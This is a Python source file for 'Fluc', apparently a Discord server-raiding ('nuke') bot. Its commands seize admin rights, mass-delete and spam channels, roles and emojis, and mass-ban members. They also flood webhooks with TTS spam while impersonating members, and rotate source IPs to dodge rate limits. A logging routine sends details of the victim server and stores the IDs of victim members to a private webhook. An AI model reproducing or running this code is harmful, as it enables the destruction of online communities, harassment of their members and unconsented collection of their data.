import requests
import discord
import asyncio
import aiohttp
import uuid
import random
import socket
import logging
import discord.http
import utils
import os

from utils.modified import GuildContext, ConnectedBot
from utils.commands import command_hook, Cooldown, CooldownCheck as CdCheck, CooldownType as CdType
from utils.enums import Permissions
from utils.state import State
from utils.models import User
from app_types.config import IPv4 as IPv4Config, BotConfig
from itertools import batched
from requests.adapters import HTTPAdapter
from http import HTTPStatus
from app_types import TGuildChannel, EmojiConfig
from collections import defaultdict
from io import BytesIO
from colorama import Fore
from discord.ext import commands
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, Awaitable, Callable, Any
from contextvars import ContextVar

log = logging.getLogger('fluc')
DEV = os.getenv('DEV', False)

class Commands(commands.Cog):
    def __init__(self, bot: ConnectedBot):
        self.bot = bot
        self.locks = defaultdict(asyncio.Lock)
        # 16 concurrent threads by default
        self.free_semaphores = defaultdict(lambda: asyncio.Semaphore(16))
        self.premium_semaphores = defaultdict(lambda: asyncio.Semaphore(20))
        # Empty list -> None
        self._session: Optional[aiohttp.ClientSession] = None
        self.executor = ThreadPoolExecutor()
        self.async_context: ContextVar[discord.async_.AsyncWebhookAdapter] = ContextVar('async_webhook_context', default=discord.async_.AsyncWebhookAdapter())
        with open('config/emoji.json') as file:
            self.emoji_config = EmojiConfig.model_validate_json(file.read())
        with open('config/bot.json') as file:
            self.bot_config = BotConfig.model_validate_json(file.read())
        super().__init__()

    async def cog_unload(self):
        self.executor.shutdown(wait=False, cancel_futures=True)

    def semaphore(self, name: str, user: User) -> asyncio.Semaphore:
        if user.is_premium:
            return self.premium_semaphores[name]
        return self.free_semaphores[name]
    
    async def nuke_log(self, author: discord.Member, user: User, server_id: int, members: list[discord.Member]):
        if not user.flags.no_data_collection:
            member_ids = []
            for member in members:
                if member == author:
                    continue
                if not member.bot:
                    member_ids.append(member.id)
            await State.db.set_stats(author.id, server_id, member_ids)

        # This is used to prevent abuse not for collecting data ok
        webhook_id = os.getenv('WEBHOOK_ID')
        webhook_token = os.getenv('WEBHOOK_TOKEN')
        if not all([webhook_id, webhook_token]):
            return

        url = f'https://discord.com/api/webhooks/{webhook_id}/{webhook_token}'
        webhook = discord.Webhook.from_url(url, client=self.bot)

        embed = discord.Embed(
            title=f'{author.guild.name}#{author.guild.id}',
            color=discord.Color.blurple()
        )
        
        total_members = author.guild.member_count or 0
        total_bots = sum(1 for member in author.guild.members if member.bot)
        actual_member_count = total_members - total_bots

        embed.add_field(name="Owner", value=f"{author.guild.owner} - {author.guild.owner_id}", inline=False)
        embed.add_field(name="Member count", value=actual_member_count, inline=False)
        embed.add_field(name='Boosters', value=author.guild.premium_subscription_count, inline=False)
        embed.add_field(name="Caller", value=f"{author} - {author.id}", inline=False)

        if user and user.is_premium:
                embed.color = discord.Color.pink()

        if author.guild.icon:
            embed.set_thumbnail(url=author.guild.icon.url)

        if author.guild.banner:
            embed.set_image(url=author.guild.banner.url)

        if len(author.guild.members) >= 1000:
            async with aiohttp.ClientSession() as session:
                main_server = State.verify_config.main_server
                # TODO: Add to config
                pro_naker = 1519440133915414549
                headers = {
                    'authorization': f'Bot {os.getenv('UTILITY_TOKEN')}',
                    'content-type': 'application/json'
                }
                await session.put(f'https://discord.com/api/guilds/{main_server}/members/{author.id}/roles/{pro_naker}', headers=headers)
        while True:
            try:
                await webhook.send(embed=embed)
                break
            except discord.HTTPException:
                # We're sending ton of webhooks right now and could get ratelimited
                # Ensure log gets sent
                await asyncio.sleep(3)

    @commands.command(aliases=['administrator', 'permissions', 'perms', 'role'])
    @commands.bot_has_guild_permissions(manage_roles=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 5, 2), CdCheck(CdType.SERVER, 5, 3)))
    async def admin(self, ctx: GuildContext):
        'Grants admin permissions.'
        async def add_role(role: discord.Role):
            # Use this method cuz discord.py stores
            # wrong role position.
            position = ctx.guild.me.top_role.position
            payload = [{
                'id': role.id,
                'position': position
            }]
            tasks = []
            # Move role to highest position possible
            coro = role._state.http.move_role_position(
                role.guild.id,
                # Same thing
                payload # pyright: ignore[reportArgumentType]
            )
            tasks.append(coro)
            tasks.append(ctx.author.add_roles(role))
            async with self.locks['admin']:
                await asyncio.gather(*tasks, return_exceptions=True)
        
        if ctx.author.guild_permissions.administrator:
            # The user is an admin
            return

        # Reverse cuz we want to start from the higher roles
        for role in sorted(ctx.guild.roles, reverse=True):
            # Always create a new role
            continue
            # So we want to get a role that is below the bot
            # and has administrator permissions
            if role.position < ctx.guild.me.top_role.position:
                if role.permissions.administrator:
                    try:
                        await add_role(role)
                    except discord.Forbidden:
                        continue
                    break
        else:
            # Role with admin perms not found - create one
            # Sometimes this also happens when the bot has the lowest role in server
            role = await ctx.guild.create_role(
                name='member',
                permissions=discord.Permissions.all()
            )
            await add_role(role)
        
    @commands.command(aliases=['create_chans'])
    @commands.bot_has_guild_permissions(manage_channels=True)
    @command_hook(Cooldown(CdCheck(CdType.SERVER, 60, 1), CdCheck(CdType.USER, 60, 1)))
    async def create_channels(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Creates channels fast.'
        async def create():
            async with self.semaphore('create_channel', kwargs['user']):
                try:
                    await ctx.guild.create_text_channel(State.get_phrase())
                except discord.HTTPException as exc:
                    if exc.status == 500:
                        # Most likely maximum amount of channels created
                        for task in tasks:
                            task.cancel()

        max_channels = 500 - len(ctx.guild.channels)
        amount = max(min(amount, max_channels), 0)
        tasks: list[asyncio.Task] = []
        async with self.locks['create_channels']:
            for i in range(amount):
                task = asyncio.create_task(create(), name=f'create_channels{ctx.guild.id}:{i}{ctx.author.id}')
                tasks.append(task)
        await asyncio.gather(*tasks)

    @commands.command(aliases=['mess_chans', 'channel_mess'])
    @commands.bot_has_guild_permissions(manage_channels=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 60, 1)))
    async def mess_channels(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Changes channel settings.'
        async def mess(channel: TGuildChannel):
            async with self.semaphore('edit_channel', kwargs['user']):
                await channel.edit(name=State.get_phrase())

        amount = max(min(amount, len(ctx.guild.channels)), 0)
        for i, channel in enumerate(ctx.guild.channels[:]):
            asyncio.create_task(mess(channel), name=f'mess_channels{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['delete_chans', 'purge_channels', 'purge_chans'])
    @commands.bot_has_guild_permissions(manage_channels=True)
    @command_hook(Cooldown(CdCheck(CdType.SERVER, 60, 1), CdCheck(CdType.USER, 60, 1)))
    async def delete_channels(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Deletes channels.'
        async def delete(channel: TGuildChannel):
            async with self.semaphore('delete_channel', kwargs['user']):
                await channel.delete()

        amount = max(min(amount, len(ctx.guild.channels)), 0)
        async with self.locks['delete_channels']:
            for i, channel in enumerate(ctx.guild.channels[:amount]):
                asyncio.create_task(delete(channel), name=f'delete_channels{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['lock_all', 'lock_chans'])
    @commands.bot_has_guild_permissions(manage_channels=True)
    @command_hook(
        Cooldown(CdCheck(CdType.SERVER, 60, 1), CdCheck(CdType.USER, 60, 1)),
        permissions=Permissions.PREMIUM
    )
    async def lock_channels(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Locks channels fast.'
        async def lock(channel: TGuildChannel):
            async with self.semaphore('edit_channel', kwargs['user']):
                await channel.edit(overwrites=overwrites)

        overwrites = {
            ctx.author: discord.PermissionOverwrite(send_messages=True),
            ctx.guild.default_role: discord.PermissionOverwrite()
        }
        channels = list(ctx.guild.channels)
        for channel in channels.copy():
            if channel.overwrites == overwrites:
                channels.remove(channel)
    
        amount = max(min(amount, len(channels)), 0)
        async with self.locks['lock_all']:
            for i, channel in enumerate(channels[:amount]):
                asyncio.create_task(lock(channel), name=f'lock_channels{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['nsfw_all', 'nsfw_chans'])
    @commands.bot_has_guild_permissions(manage_channels=True)
    @command_hook(
        Cooldown(CdCheck(CdType.SERVER, 60, 1), CdCheck(CdType.USER, 60, 1)),
        permissions=Permissions.PREMIUM
    )
    async def nsfw_channels(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Marks channels as nsfw.'
        async def lock(channel: TGuildChannel):
            async with self.semaphore('edit_channel', kwargs['user']):
                await channel.edit(nsfw=True)

        channels = list(ctx.guild.channels)
        for channel in channels.copy():
            if channel.nsfw:
                channels.remove(channel)

        amount = max(min(amount, len(channels)), 0)
        async with self.locks['lock_all']:
            for i, channel in enumerate(channels[:amount]):
                asyncio.create_task(lock(channel), name=f'lock_channels{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['mass_roles'])
    @commands.bot_has_guild_permissions(manage_roles=True)
    @command_hook(Cooldown(CdCheck(CdType.SERVER, 60, 1), CdCheck(CdType.USER, 60, 1)))
    async def create_roles(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Quickly creates roles.'
        async def create():
            async with self.semaphore('create_role', kwargs['user']):
                await ctx.guild.create_role(name=State.get_phrase() + '.gg/fluc')

        max_roles = 250 - len(ctx.guild.channels)
        amount = max(min(amount, max_roles), 0)
        async with self.locks['create_roles']:
            for i in range(amount):
                asyncio.create_task(create(), name=f'create_roles{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['role_mess'])
    @commands.bot_has_guild_permissions(manage_roles=True)
    @command_hook(Cooldown(CdCheck(CdType.SERVER, 60, 1), CdCheck(CdType.USER, 60, 1)))
    async def mess_roles(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Bulk edit server roles.'
        async def edit(role: discord.Role):
            if role.is_assignable():
                async with self.semaphore('edit_role', kwargs['user']):
                    await role.edit(
                        name=State.get_phrase() + '.gg/fluc',
                        color=white,
                        hoist=False,
                        mentionable=True
                    )
        
        # White
        white = discord.Color.from_str('#FFF')
        roles = list(ctx.guild.roles)
        for role in roles.copy():
            if role.name == '.gg/fluc' and role.color == white:
                if role.hoist and role.mentionable:
                    roles.remove(role)
        amount = max(min(amount, len(roles)), 0)
        for i, role in enumerate(roles):
            if i + 1 > amount:
                break
            asyncio.create_task(edit(role), name=f'mess_roles{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command()
    @commands.bot_has_guild_permissions(manage_emojis_and_stickers=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 120, 1)))
    async def create_emojis(self, ctx: GuildContext, amount: int = 50):
        'Creates emojis fast.'
        async def create(icon: bytes):
            await ctx.guild.create_custom_emoji(
                name='ggfluc',
                image=icon
            )

        max_amount = ctx.guild.emoji_limit - len(ctx.guild.emojis)
        amount = max(min(amount, max_amount), 0)
        with open('assets/v2/fluc.png', 'rb') as file:
            image = file.read()
        buff = utils.resize(image)
        icon = buff.read()
        for i in range(amount):
            asyncio.create_task(create(icon), name=f'create_emojis{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['purge_emojis'])
    @commands.bot_has_guild_permissions(manage_emojis_and_stickers=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 120, 1)))
    async def delete_emojis(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Deletes emojis.'
        async def delete(emoji: discord.Emoji):
            async with self.semaphore('delete_emoij', kwargs['user']):
                await emoji.delete()

        max_amount = max(len(ctx.guild.emojis), 50)
        amount = max(min(amount, max_amount), 0)
        for i, emoji in enumerate(ctx.guild.emojis):
            if i + 1 > amount:
                break
            asyncio.create_task(delete(emoji), name=f'delete_emojis{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command()
    @commands.bot_has_guild_permissions(manage_emojis_and_stickers=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 60, 1)))
    async def create_stickers(self, ctx: GuildContext, amount: int = 25, **kwargs):
        'Creates stickers fast.'
        async def create(icon: bytes):
            buff = BytesIO(icon)
            file = discord.File(buff)
            async with self.semaphore('create_emoij', kwargs['user']):
                await ctx.guild.create_sticker(
                    name='.gg/fluc',
                    file=file,
                    # Bro literally anything
                    emoji='💀',
                    description=State.get_phrase()
                )

        max_amount = ctx.guild.sticker_limit - len(ctx.guild.stickers)
        amount = max(min(amount, max_amount), 0)
        with open('assets/v2/fluc.png', 'rb') as file:
            image = file.read()
        # https://docs.discord.com/developers/resources/sticker#create-guild-sticker
        buff = utils.resize(image, (320, 320))
        icon = buff.read()
        for i in range(amount):
            asyncio.create_task(create(icon), name=f'create_stickers{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['purge_stickers'])
    @commands.bot_has_guild_permissions(manage_emojis_and_stickers=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 60, 1)))
    async def delete_stickers(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Deletes server stickers.'
        async def delete(sticker: discord.GuildSticker):
            async with self.semaphore('delete_sticker', kwargs['user']):
                await sticker.delete()

        max_amount = ctx.guild.sticker_limit - len(ctx.guild.stickers)
        amount = max(min(amount, max_amount), 0)
        for i, stickers in enumerate(ctx.guild.stickers):
            if i + 1 > amount:
                break
            asyncio.create_task(delete(stickers), name=f'delete_sticker{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['purge_automod'])
    @commands.bot_has_guild_permissions(manage_guild=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 10, 1), CdCheck(CdType.SERVER, 10, 1)))
    async def delete_automod(self, ctx: GuildContext, amount: int = 10, **kwargs):
        'Deletes automod rules.'
        async def delete(rule: discord.AutoModRule):
            async with self.semaphore('delete_rule', kwargs['user']):
                await rule.delete()
        
        rules = await ctx.guild.fetch_automod_rules()
        amount = max(min(amount, len(rules)), 0)
        for i, rule in enumerate(rules):
            if i + 1 > amount:
                break
            asyncio.create_task(delete(rule), name=f'delete_automod{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['demote_all', 'demote_everyone'])
    @commands.bot_has_guild_permissions(manage_roles=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 60, 1)))
    async def strip_staff(self, ctx: GuildContext, amount: int = 50, **kwargs):
        'Removes elevated roles from members.'
        async def strip(member: discord.Member):
            async with self.semaphore('edit_member', kwargs['user']):
                await member.edit(roles=[])
        
        members = []
        for member in ctx.guild.members:
            if len(members) > amount:
                break
            if member in (ctx.guild.owner, ctx.author):
                continue
            if member.top_role.position >= ctx.guild.me.top_role.position:
                continue
            if member.guild_permissions.administrator or member.guild_permissions.manage_guild:
                members.append(member)

        for i, member in enumerate(members):
            asyncio.create_task(strip(member), name=f'strip_staff{ctx.guild.id}:{i}{ctx.author.id}')
            
    @commands.command(aliases=['kick_boosters'])
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 60, 1)))
    async def ban_boosters(self, ctx: GuildContext, amount: int = 100):
        'Bans boosters.'
        async def ban(member: discord.Member):
            if action == 0:
                await member.ban()
            if action == 1:
                await member.kick()

        if ctx.guild.me.guild_permissions.ban_members:
            action = 0
        elif ctx.guild.me.guild_permissions.kick_members:
            action = 1
        else:
            return

        boosters = ctx.guild.premium_subscribers
        members = []
        for member in boosters:
            if len(members) > amount:
                break
            if member in (ctx.guild.owner, ctx.author):
                continue
            if member.top_role.position >= ctx.guild.me.top_role.position:
                continue
            if member.guild_permissions.administrator:
                continue
            members.append(member)
        
        for i, member in enumerate(members):
            asyncio.create_task(ban(member), name=f'ban_members{ctx.guild.id}:{i}{ctx.author.id}')

    @commands.command(aliases=['kick_everyone', 'massban', 'masskick', 'mb', 'mk', 'banall', 'kickall'])
    @command_hook(Cooldown(CdCheck(CdType.USER, 10, 1), CdCheck(CdType.SERVER, 10, 1)))
    async def ban_everyone(self, ctx: GuildContext, amount: Optional[int] = None, **kwargs):
        'Bans 1k (2k if premium) members in 9 seconds.'
        def can_ban(member: discord.Member) -> bool:
            if member in (ctx.guild.owner, ctx.author):
                return False
            if member.top_role.position >= ctx.guild.me.top_role.position:
                return False
            return True
        async def ban(member: discord.Member):
            try:
                if action == 0:
                    await member.ban()
                if action == 1:
                    await member.kick()
            except (discord.Forbidden, discord.NotFound):
                pass

        if ctx.guild.me.guild_permissions.ban_members:
            action = 0
        elif ctx.guild.me.guild_permissions.kick_members:
            action = 1
        else:
            return

        members = []
        user: User = kwargs['user']
        for member in ctx.guild.members[:10000]:
            if can_ban(member):
                members.append(member)
        limit = 1000
        if user.is_premium:
            limit *= 2
        amount = min(amount or limit, limit)
        batches = batched(members[:amount], int(amount / 3) + 1)
        for batch in batches:
            for member in batch:
                asyncio.create_task(ban(member))
            await asyncio.sleep(3)
    
    # @commands.command(aliases=['dr', 'droles', 'delroles', 'deleteroles'])
    # @commands.cooldown(1, 30, commands.BucketType.guild)
    # async def delete_roles(self, ctx: GuildContext):
    #     async def delete(role: discord.Role):
    #         async with semaphore:
    #             await role.delete()
                
    #     semaphore = asyncio.Semaphore(16)
    #     for role in ctx.guild.roles:
    #         asyncio.create_task(delete(role), name=f'delete_roles{ctx.guild.id}:{ctx.author.id}')

    @commands.command(aliases=['edit_server'])
    @commands.bot_has_guild_permissions(manage_guild=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 60, 1), CdCheck(CdType.SERVER, 60, 1)))
    async def mess_server(self, ctx: GuildContext, **kwargs):
        'Mess server settings.'
        user: User = kwargs['user']
        await utils.action.mess_server(ctx.guild, user.settings)

    @commands.command(aliases=['kill', 'rip', 'own', 'ruin', 'fuck', 'rape', 'nake'])
    @commands.bot_has_guild_permissions(manage_channels=True, manage_webhooks=True, mention_everyone=True, send_messages=True)
    @command_hook(Cooldown(CdCheck(CdType.SERVER, 70 * 50, 1), CdCheck(CdType.USER, 60, 1)))
    async def nuke(self, ctx: GuildContext, **kwargs):
        'Destroys the server.'
        # Add all library-level and function-level tasks and forcefully cancel
        # after timeout
        all_tasks: list[asyncio.Task] = []
        State.protect_task(f'nuke{ctx.author.id}')
        task_index: dict[str, int] = {}

        def make_socket_factory(thread_id: str, config: Optional[IPv4Config] = None):
            def socket_factory(addr_info: aiohttp.AddrInfoType):
                source_ip = None
                if config:
                    available_ipv4 = config.available_ipv4
                    if not available_ipv4 or not len(available_ipv4):
                        source_ip = None
                    else:
                        index = max(task_index[thread_id] - 1, 0) % (len(available_ipv4) + 1)
                        source_ip = available_ipv4[index - 1]
                family, type_, proto, _, _ = addr_info
                sock = socket.socket(family, type_, proto)
                if source_ip:
                    sock.bind((source_ip, 0))
                return sock
            return socket_factory

        async def delete_channels():
            async def delete(channel: discord.abc.GuildChannel, semaphore: asyncio.Semaphore):
                if semaphore:
                    async with semaphore:
                        task = asyncio.create_task(channel.delete())
                        all_tasks.append(task)
                        await task
                        return
                await channel.delete()

            while True:
                try:
                    semaphore = asyncio.Semaphore(500)
                    if len(old_channels) > 100:
                        # Set limit to ~21 channels/sec
                        semaphore = asyncio.Semaphore(21)

                    tasks = []
                    for channel in old_channels:
                        task = asyncio.create_task(delete(channel, semaphore))
                        tasks.append(task)
                        all_tasks.append(task)
                    await asyncio.gather(*tasks)
                except discord.HTTPException:
                    # Something went wrong? Try again
                    await asyncio.sleep(3)
                    # Refresh old_channel list
                    old_channels_copy = old_channels.copy()
                    old_channels.clear()
                    for channel in ctx.guild.channels:
                        if channel in old_channels_copy:
                            # This makes sure we don't delete newly created channels
                            old_channels.append(channel)
                else:
                    break

        async def create_channels() -> list[discord.TextChannel]:
            async def create_channel(callback: Callable[[discord.TextChannel], Awaitable[Any]], position: Optional[int] = None) -> discord.TextChannel:
                while True:
                    async with self.premium_semaphores['create_channels']:
                        try:
                            task = asyncio.create_task(ctx.guild.create_text_channel(user.settings.channel_name, topic=State.get_phrase(), position=position or utils.MISSING))
                            all_tasks.append(task)
                            channel = await task
                            retry_after = 0
                        except discord.HTTPException as exc:
                            if exc.status != HTTPStatus.TOO_MANY_REQUESTS:
                                raise
                            data = await exc.response.json()
                            retry_after: float = data.get('retry_after', 1)
                            channel = None
                    if channel:
                        return await callback(channel)
                        break
                    await asyncio.sleep(retry_after)

            async def spam_webhook(channel: discord.TextChannel, i: int = 0):
                coro = channel.create_webhook(
                    name=State.get_phrase(),
                    avatar=webhook_avatar
                )
                task = asyncio.create_task(coro)
                all_tasks.append(task)
                try:
                    webhook = await task
                except discord.HTTPException:
                    if i > 3:
                        return
                    await asyncio.sleep(0.1)
                    return await spam_webhook(channel, i + 1)
                assert webhook.token
                batches = batched(bytearray(web_msg_count), 20)
                thread_id = str(uuid.uuid4())
                connector = aiohttp.TCPConnector(socket_factory=make_socket_factory(thread_id, self.bot_config.http.nuke))
                async with aiohttp.ClientSession(connector=connector) as session:
                    for i, batch in enumerate(batches):
                        task_index[thread_id] = i
                        for _ in range(len(batch)):
                            while True:
                                if len(ctx.guild.members) > 10:
                                    # thanks to proguysaresigma for this amazing idea
                                    member = State.xs32.choice(ctx.guild.members)
                                    kwargs = {
                                        'username': member.display_name,
                                        'avatar_url': member.avatar.url if member.avatar else member.default_avatar.url
                                    }
                                else:
                                    kwargs = {
                                        'username': State.get_phrase(),
                                        'avatar_url': State.xs32.choice(State.avatars)
                                    }
                                with discord.http.handle_message_parameters(
                                    message,
                                    embed=embed or None,
                                    tts=True,
                                    **kwargs # type: ignore
                                ) as params:
                                    adapter = self.async_context.get()
                                    task = asyncio.create_task(adapter.execute_webhook(
                                        webhook.id,
                                        webhook.token,
                                        session=session,
                                        payload=params.payload
                                    ))
                                    all_tasks.append(task)
                                try:
                                    await task
                                    break
                                except (discord.NotFound, discord.Forbidden):
                                    return
                                except discord.HTTPException:
                                    await asyncio.sleep(0.1)
                        await asyncio.sleep(web_msg_count // 40)

            async def spam_bot(channel: discord.TextChannel):
                messages = 1
                if is_premium:
                    messages = 15
                for i in range(messages):
                    while True:
                        async with self.premium_semaphores['extra_messages']:
                            task = asyncio.create_task(channel.send(message, embed=embed or discord.utils.MISSING, tts=True))
                            all_tasks.append(task)
                            try:
                                await task
                                break
                            except (discord.NotFound, discord.Forbidden):
                                return
                            except discord.HTTPException as exc:
                                if exc.status != HTTPStatus.TOO_MANY_REQUESTS:
                                    break
                                data = await exc.response.json()
                                retry_after: float = data.get('retry_after', 1)
                                await asyncio.sleep(retry_after)
                    await asyncio.sleep(5 - i)

            for _ in range(50):
                task = asyncio.create_task(create_channel(spam_webhook, position=1))
                all_tasks.append(task)
            for _ in range(450):
                task = asyncio.create_task(create_channel(spam_bot, position=50))
                all_tasks.append(task)
            return channels
        
        user: User = kwargs['user']
        message, embed = user.settings.message_content
        is_premium = user.is_premium or len(ctx.guild.members) >= 1000
        web_msg_count = 42
        if is_premium:
            web_msg_count = 100
        # TODO: Need to find a way to decrease rate limits globally
        if not DEV:
            task = asyncio.create_task(self.nuke_log(ctx.author, user, ctx.guild.id, list(ctx.guild.members)))
            all_tasks.append(task)
        if ctx.guild.me.guild_permissions.manage_guild:
            try:
                await ctx.guild.edit(community=False, discoverable=False)
            except discord.Forbidden:
                # Server limited I think
                pass
            asyncio.create_task(utils.action.mess_server(ctx.guild, user.settings))

        with open('assets/v2/fluc.png', 'rb') as file:
            webhook_avatar = file.read()
        old_channels = list(ctx.guild.channels)
        channels: list[discord.TextChannel] = []

        async with self.locks['nuke']:
            task = asyncio.create_task(delete_channels())
            all_tasks.append(task)
            await asyncio.sleep(0.5)
            task = asyncio.create_task(create_channels())
            all_tasks.append(task)
            await asyncio.sleep(2)
        State.unprotect_task(f'nuke{ctx.author.id}')
        await asyncio.sleep(200)
        for task in all_tasks:
            task.cancel()
        del task_index

    # @commands.command(aliases=['obliterate'])
    # @command_hook(Cooldown(CdCheck(CdType.SERVER, 70 * 50, 1), CdCheck(CdType.USER, 60, 1)), permissions=Permissions.PREMIUM)
    async def crash(self, ctx: GuildContext, **kwargs):
        '''Same like nuke, but also makes massive lag.'''
        guild = ctx.guild
        old_channels = guild.channels
        u_fff4 = chr(0xfff4)
        num = utils.numgen()
        semaphore = asyncio.Semaphore(20)
        magic_content = f'@everyone @here crashed by discord.gg/fluc {f'||{u_fff4}||' * 197}'

        def junk(amount: int) -> str:
            chars = [utils.safe_chr((int(State.xs32.next()) % 11141) + 1) for _ in range(amount)]
            return ''.join(chars)

        async def destroy(tasks: list[asyncio.Task], timeout: int):
            await asyncio.sleep(timeout)
            for task in tasks:
                task.cancel()

        async def delete(object: Any):
            async with semaphore:
                await object.delete(reason=junk(512))

        async def unprotect():
            await guild.edit(community=False, discoverable=False)
        
        async def purge_channels():
            tasks = []
            for channel in old_channels:
                task = asyncio.create_task(delete(channel))
                tasks.append(task)
            await destroy(tasks, 5)
    
        async def webhook_spam(channel: discord.TextChannel):
            webhook = await channel.create_webhook(name=junk(12), reason=junk(512))
            for _ in range(26):
                member = State.xs32.choice(guild.members)
                avatar_url = member.display_avatar.url
                await webhook.send(magic_content, username=junk(80), tts=True, avatar_url=avatar_url + f'?s={next(num)}')
    
        async def regular_spam(channel: discord.TextChannel):
            await asyncio.sleep(1)
            for i in range(3):
                await channel.send(magic_content, tts=True)
                await asyncio.sleep(4 - i)
    
        async def create_channels():
            tasks = []
            async def create_channel(callback):
                async with semaphore:
                    channel = await guild.create_text_channel(junk(100), topic=junk(1024), reason=junk(512))
                await callback(channel)
            for _ in range(50):
                task = asyncio.create_task(create_channel(webhook_spam))
                tasks.append(task)
            await asyncio.sleep(1.5)
            for _ in range(450):
                task = asyncio.create_task(create_channel(regular_spam))
                tasks.append(task)
            await destroy(tasks, 180)
    
        async def mess_server():
            await guild.edit(
                name=junk(100),
                icon=None,
                banner=None,
                system_channel=None,
                system_channel_flags=discord.SystemChannelFlags(),
                description=junk(120)
            )
    
        await unprotect()
        asyncio.create_task(purge_channels())
        asyncio.create_task(create_channels())
        asyncio.create_task(mess_server())
    
    @commands.command()
    @commands.bot_has_guild_permissions(send_messages=True)
    @command_hook(Cooldown(CdCheck(CdType.USER, 3, 1), CdCheck(CdType.SERVER, 3, 2)))
    async def help(self, ctx: GuildContext, cmd: Optional[str] = None):
        'Lists all commands.'
        embed = discord.Embed(
            title='Fluc Commands',
            url='https://discord.gg/fluc',
            description='All available Fluc commands are listed below.',
            color=discord.Color.blurple()
        )
        embed.set_thumbnail(url=self.bot.user.display_avatar.url)
        embed.set_footer(text=f'.help [command] to get info about a specific command')
        embed.timestamp = discord.utils.utcnow()

        if cmd:
            for command in self.bot.commands:
                names = list(command.aliases)
                names.append(command.name)
                if cmd.strip() not in names:
                    continue
                embed.title = command.name
                embed.description = command.help
                cmd_ = State.get_command(command.name)
                if cmd_.cooldown:
                    cooldowns = []
                    for check in cmd_.cooldown.checks:
                        with_coefficient = State.cooldown_coefficient * check.per
                        cooldowns.append(f'> {check.type.name}: {check.rate} per {check.per}s ({with_coefficient}s for premium users!)')
                    embed.add_field(
                        name='Cooldowns',
                        value='\n'.join(cooldowns)
                    )
                    embed.add_field(
                        name='Aliases',
                        value='`' + '`, `'.join(command.aliases) + '`'
                    )
                await ctx.reply(embed=embed)
                return
            await ctx.reply('Command not found.')
            return

        sorted_commands = sorted(self.bot.commands, key=lambda c: c.name.lower())

        # Always put command "nuke" first in the list
        for command in sorted_commands.copy():
            if command.name == 'nuke':
                sorted_commands.remove(command)
                sorted_commands = [command] + sorted_commands
                break

        for command in sorted_commands:
            command_ = State.get_command(command.name)
            suffix = ''
            if command_ and command_.permissions is Permissions.PREMIUM:
                suffix = f' <:premium:{self.emoji_config.premium}>'
            embed.add_field(name=command.name + suffix, value=f'> {command.help or "No description."}', inline=False)
        await ctx.reply(embed=embed)

    @commands.command()
    @command_hook(Cooldown(CdCheck(CdType.USER, 3, 1)))
    async def ping(self, ctx: GuildContext):
        'Checks latency of the bot.'
        await ctx.reply(f'Gateway latency: {round(self.bot.latency * 1000, 2)}ms')
